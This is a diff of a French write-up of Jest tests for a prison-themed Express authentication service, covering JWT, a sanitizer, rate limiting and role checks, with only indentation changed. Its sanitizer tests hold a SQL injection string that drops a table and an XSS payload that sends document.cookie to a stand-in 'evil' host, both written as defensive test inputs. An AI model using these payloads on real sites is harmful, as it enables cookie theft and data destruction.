@@ -11,16 +11,16 @@ Avant de toucher Express, le service d'auth est testé isolément.
 
 ```js
 test('sign() génère un token avec les claims corrects', () => {
-  const token = authService.sign({ id: 'scofield', role: 'inmate' });
-  const decoded = jwt.decode(token);
-  expect(decoded.id).toBe('scofield');
-  expect(decoded.role).toBe('inmate');
-  expect(decoded.exp).toBeDefined();
+ const token = authService.sign({ id: 'scofield', role: 'inmate' });
+ const decoded = jwt.decode(token);
+ expect(decoded.id).toBe('scofield');
+ expect(decoded.role).toBe('inmate');
+ expect(decoded.exp).toBeDefined();
 });
 
 test('verify() lève une AuthError sur token expiré', () => {
-  const expiredToken = jwt.sign({ id: 'x' }, SECRET, { expiresIn: '-1s' });
-  expect(() => authService.verify(expiredToken)).toThrow(AuthError);
+ const expiredToken = jwt.sign({ id: 'x' }, SECRET, { expiresIn: '-1s' });
+ expect(() => authService.verify(expiredToken)).toThrow(AuthError);
 });
 ```
 
@@ -34,17 +34,17 @@ Le sanitizer est testé séparément, sans serveur.
 
 ```js
 test('bloque une injection SQL basique', () => {
-  const malInput = "scofield'; DROP TABLE prisonniers; --";
-  expect(() => sanitizer.validateCode(malInput)).toThrow(ValidationError);
+ const malInput = "scofield'; DROP TABLE prisonniers; --";
+ expect(() => sanitizer.validateCode(malInput)).toThrow(ValidationError);
 });
 
 test('bloque un payload XSS dans un champ texte', () => {
-  const xss = '<script>fetch("http://tbag.evil/", {method:"POST", body: document.cookie})</script>';
-  expect(() => sanitizer.validateText(xss)).toThrow(ValidationError);
+ const xss = '<script>fetch("http://tbag.evil/", {method:"POST", body: document.cookie})</script>';
+ expect(() => sanitizer.validateText(xss)).toThrow(ValidationError);
 });
 
 test('laisse passer un code prisonnier valide', () => {
-  expect(() => sanitizer.validateCode('scofield-83712')).not.toThrow();
+ expect(() => sanitizer.validateCode('scofield-83712')).not.toThrow();
 });
 ```
 
@@ -56,21 +56,21 @@ Premier implémentation : trop permissive, le test XSS passait avec des guilleme
 
 ```js
 test('bloque après 5 tentatives depuis la même IP', () => {
-  const ip = '192.168.1.100';
-  for (let i = 0; i < 5; i++) {
-    rateLimiter.record(ip);
-  }
-  expect(rateLimiter.isBlocked(ip)).toBe(true);
+ const ip = '192.168.1.100';
+ for (let i = 0; i < 5; i++) {
+  rateLimiter.record(ip);
+ }
+ expect(rateLimiter.isBlocked(ip)).toBe(true);
 });
 
 test('reset automatique après 15 minutes', () => {
-  jest.useFakeTimers();
-  const ip = '10.0.0.1';
-  for (let i = 0; i < 5; i++) rateLimiter.record(ip);
+ jest.useFakeTimers();
+ const ip = '10.0.0.1';
+ for (let i = 0; i < 5; i++) rateLimiter.record(ip);
 
-  jest.advanceTimersByTime(16 * 60 * 1000);
-  expect(rateLimiter.isBlocked(ip)).toBe(false);
-  jest.useRealTimers();
+ jest.advanceTimersByTime(16 * 60 * 1000);
+ expect(rateLimiter.isBlocked(ip)).toBe(false);
+ jest.useRealTimers();
 });
 ```
 
@@ -82,22 +82,22 @@ test('reset automatique après 15 minutes', () => {
 
 ```js
 test('POST /auth/chakra_gate retourne un JWT valide avec les bons credentials', async () => {
-  const res = await request(app)
-    .post('/auth/chakra_gate')
-    .send({ code: 'scofield-83712', pin: 'S0a0r0i3' });
+ const res = await request(app)
+  .post('/auth/chakra_gate')
+  .send({ code: 'scofield-83712', pin: 'S0a0r0i3' });
 
-  expect(res.status).toBe(200);
-  expect(res.body.token).toBeDefined();
+ expect(res.status).toBe(200);
+ expect(res.body.token).toBeDefined();
 });
 
 test('POST /auth/chakra_gate retourne 401 avec des credentials incorrects', async () => {
-  const res = await request(app)
-    .post('/auth/chakra_gate')
-    .send({ code: 'tbag', pin: 'mauvais' });
+ const res = await request(app)
+  .post('/auth/chakra_gate')
+  .send({ code: 'tbag', pin: 'mauvais' });
 
-  expect(res.status).toBe(401);
-  expect(res.body.error).toBe('InvalidCredentialsError');
-  expect(res.body.stack).toBeUndefined(); // pas de stack trace leakée
+ expect(res.status).toBe(401);
+ expect(res.body.error).toBe('InvalidCredentialsError');
+ expect(res.body.stack).toBeUndefined(); // pas de stack trace leakée
 });
 ```
 
@@ -109,17 +109,17 @@ Le deuxième test a attrapé une première version du handler qui retournait `er
 
 ```js
 test('GET /plan/phase/2 retourne 401 sans token', async () => {
-  const res = await request(app).get('/plan/phase/2');
-  expect(res.status).toBe(401);
+ const res = await request(app).get('/plan/phase/2');
+ expect(res.status).toBe(401);
 });
 
 test('GET /plan/phase/2 retourne 403 si role inmate mais phase admin-only', async () => {
-  const token = authService.sign({ id: 'tbag', role: 'inmate' });
-  const res = await request(app)
-    .get('/plan/phase/0')   // phase de contrôle, admin seulement
-    .set('Authorization', `Bearer ${token}`);
+ const token = authService.sign({ id: 'tbag', role: 'inmate' });
+ const res = await request(app)
+  .get('/plan/phase/0')  // phase de contrôle, admin seulement
+  .set('Authorization', `Bearer ${token}`);
 
-  expect(res.status).toBe(403);
+ expect(res.status).toBe(403);
 });
 ```
 
